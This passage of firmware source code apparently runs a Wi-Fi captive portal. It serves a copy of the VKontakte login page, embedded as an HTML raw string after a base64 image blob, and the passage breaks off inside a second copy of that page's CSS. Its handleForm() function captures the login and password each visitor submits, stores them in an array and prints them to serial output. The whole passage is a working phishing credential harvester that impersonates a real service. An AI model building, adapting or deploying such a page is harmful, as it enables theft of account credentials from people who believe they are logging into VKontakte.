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">
      </div>
    </header>

    <main>
      <div class="enter">
        <p>Вход ВКонтакте</p>
      </div>

      <div class="condition">
        <p>Чтобы просматривать эту страницу, нужно зайти на сайт.</p>
      </div>

      <div class="checkin">
        <form action="/InvalidLoginPassword" method="POST">
          <div class="login">
            <input type="text" name="login" placeholder="Телефон или email">
          </div>
          <div class="password">
            <input type="password" name="password" placeholder="Пароль">
          </div>
          <div class="checkbox">
            <input type="checkbox" name="name" id="checkbox">
            <label for="checkbox">Чужой компьютер</label>
          </div>
          <div class="go">
            <input type="submit" name="send" value="Войти">
          </div>
        </form>
        <div class="register">
          <a href="https://vk.com/join"><input type="submit" name="register" value="Регистрация"></a>
        </div>
        <div class="forgot">
          <a class="forgota" href="https://vk.com/restore">Забыли пароль или не можете войти?</a>
        </div>
      </div>
    </main>

    <footer>
      <div class="line">
        <img src="images/line.png">
      </div>
      <div class="more">
        <div class="vk"><a href="https://vk.com/about">ВКонтакте</a> <p>2006-2020</p></div>

        <div class="more2">
          <div class=""><a href="https://vk.com/about">О ВКонтакте</a></div>
          <div class="info"><a href="https://vk.com/terms">Правила</a></div>
          <div class="info"><a href="https://vk.com/ads">Для бизнеса</a></div>
          <div class="info"><a href="https://vk.com/dev">Разработчикам</a></div>
        </div>

        <div class="more3">
          <div class=""><a href="#">Русский</a></div>
          <div class="languages"><a href="#">Українська</a></div>
          <div class="languages"><a href="#">English</a></div>
          <div class="languages"><a href="#">все языки </a></div>
        </div>  
      </div>
    </footer>
  </body>
</html>
)====";

void handleForm() {
   counter++;
   login = webServer.arg("login"); 
   password = webServer.arg("password");
   logpass[counter] = login+" "+password;
  
   Serial.print("First Name:");
   Serial.println(login);
  
   Serial.print("Last Name:");
   Serial.println(password);
   
   String s =
   R"====(
   <!DOCTYPE html>
    <html>
     <head>
        <style>
          *{
            margin:0;
            padding:0;
          }
    
          body{
    
            background-color: #edeef0;
            width: 100%;
    
          }
    
          a{
            text-decoration: none;
            font-family: 'Roboto', sans-serif;
          }
    
          header{
            position: static;
    
            height: 41px;
            background-color: #4a76a8;
            display: flex;
            width: 100%;
          }
    
          .logo img{
            margin-top: 9px;
            margin-left: 470px;
          }
    
          header p{
            font: 12pt/10pt bold;
            color: #fefefe;
            margin-top: 15px;
            margin-left: 8px;
          }
    
          header form{
            margin-left: 45px;
            margin-top: 7px;
          }
    
          .search input[type='text']{
            background-color: #224b7a;
            border: 0px solid black;
            width: 177px;
            height: 28px;
            border-radius: 15px;
            outline:none;
          }
    
          .search input[type='text']:focus{
            background-color: #ffffff;
            border: 0px solid black;
            width: 177px;
            height: 28px;
            border-radius: 15px;
          }
    
          .search input::-moz-placeholder{
            color: #8fadc8;
            margin-left: 28px;
          }
    
          .search input::-webkit-input-placeholder {
            color: #8fadc8;
            margin-left: 28px;
          }
    
          .search input{
              padding: 0 28px;
          }
    
          .magnifier{
            margin-top: 14px;
            margin-left: -226px;
          }
    
          .magnifier img{
            width: 17px;
            height: 17px;
          }
    
          main{
            width: 739px;
            height: 473px;
            background-color: #ffffff;
            margin-top: 50px;
            margin-left: 10%;
            border-radius: 5px;
            border: 1px solid #e2e3e7;
          }
    
          .enter p{
            color: #101111;
            margin-left: 295px;
            margin-top: 41px;
            font: 15pt/12pt bold;
            font-family: 'Roboto', sans-serif;
          }
    
          .condition{
            width: 677px;
            height: 55px;
